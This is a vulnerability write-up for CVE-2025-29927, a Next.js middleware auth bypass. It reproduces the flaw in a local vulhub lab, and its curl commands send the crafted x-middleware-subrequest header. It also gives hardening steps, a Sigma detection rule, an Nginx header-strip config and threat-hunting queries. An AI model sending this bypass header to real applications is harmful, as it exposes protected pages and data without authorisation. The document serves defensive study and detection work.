# CVE-2025-29927 — Next.js Middleware Authorization Bypass

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2025-29927 |
| Product | Next.js < 14.2.25 / < 15.2.3 |
| Attack Vector | Network (single header, no auth needed) |
| Impact | Authentication/Authorization Bypass |
| CVSS 3.1 | 9.1 Critical |
| Patch | 14.2.25 / 15.2.3 |

Next.js middleware is commonly used for authentication and authorization checks. The framework uses an internal `x-middleware-subrequest` header to prevent infinite middleware recursion during subrequests. By sending this header with a value that exceeds the recursion limit (5 repetitions of the middleware name), an attacker tricks Next.js into skipping middleware execution entirely — bypassing all auth checks implemented in middleware.

## 2. Attack Chain

```
Recon: Identify Next.js app with middleware-based auth (307 redirect to /login)
  └─▶ Craft: Add header x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
      └─▶ Deliver: GET / with the crafted header
          └─▶ Impact: Full bypass of middleware auth → access protected pages/APIs
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/next.js/CVE-2025-29927
docker compose up -d
# Next.js 15.2.2 on port 3000, credentials: admin/password
```

### Step 1 — Confirm Middleware Auth is Active

```bash
curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/
# 307 — redirected to login page (middleware blocking access)
```

### Step 2 — Bypass Middleware with x-middleware-subrequest Header

```bash
curl -s -o /dev/null -w "%{http_code}" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3000/
# 200 — dashboard accessible without authentication
```

The header value repeats the middleware filename 5 times (colon-separated), exceeding Next.js's internal recursion limit. When the limit is hit, Next.js skips middleware execution entirely.

### Step 3 — Verify Protected Content Accessed

```bash
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://localhost:3000/ | grep -o "Admin Dashboard"
# Admin Dashboard
```

The response contains "This is a protected page that only authenticated users can access."

### Alternative Payload (src/ directory layout)

```bash
# For apps using src/ directory structure:
curl -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
  http://localhost:3000/
```

### Cleanup

```bash
docker compose down -v
```

## 4. Lessons Learned

- **Internal headers are not trustworthy**: `x-middleware-subrequest` is an internal mechanism that should never be accepted from external requests — but Next.js had no validation.
- **Recursion guards can become bypass vectors**: The recursion limit (5) was designed to prevent infinite loops, but an attacker can trigger it intentionally to skip middleware.
- **Middleware-only auth is fragile**: If all auth logic lives in middleware with no server-side backup, a single bypass exposes everything.
- **Framework-level bugs have massive blast radius**: Next.js powers millions of apps — one header bypasses auth on all of them.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade to Next.js ≥ 14.2.25 / 15.2.3 |
| Architecture | Never rely solely on middleware for auth; implement server-side checks in API routes and `getServerSideProps` |
| Reverse Proxy | Strip `x-middleware-subrequest` header from all incoming requests at the edge (Nginx/CDN) |
| Defense-in-depth | Add session validation in page components, not just middleware |

### 5.2 Detection (SIEM / WAF Rules)

```yaml
# Sigma rule — Next.js middleware bypass
title: Next.js CVE-2025-29927 Middleware Auth Bypass
logsource:
  category: webserver
detection:
  selection:
    cs-header|contains: 'x-middleware-subrequest'
  condition: selection
  level: critical
```

```
# Nginx — strip the header before it reaches Next.js
proxy_set_header x-middleware-subrequest "";
```

### 5.3 Threat Hunting

| Hypothesis | Data Source | Query Logic |
|------------|-------------|-------------|
| Middleware bypass attempted | WAF / CDN logs | Any request containing `x-middleware-subrequest` header from external source |
| Unauthorized access | Application logs | 200 responses to protected routes without valid session cookie |
| Reconnaissance | Access logs | Repeated requests to protected paths with varying header values |

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| curl | Single header injection |
| docker / vulhub | Local vulnerable environment |

- [GitHub Advisory — GHSA-f82v-jwr5-mffw](https://github.com/advisories/GHSA-f82v-jwr5-mffw)
- [NVD — CVE-2025-29927](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
- [zhero-web-sec Research](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
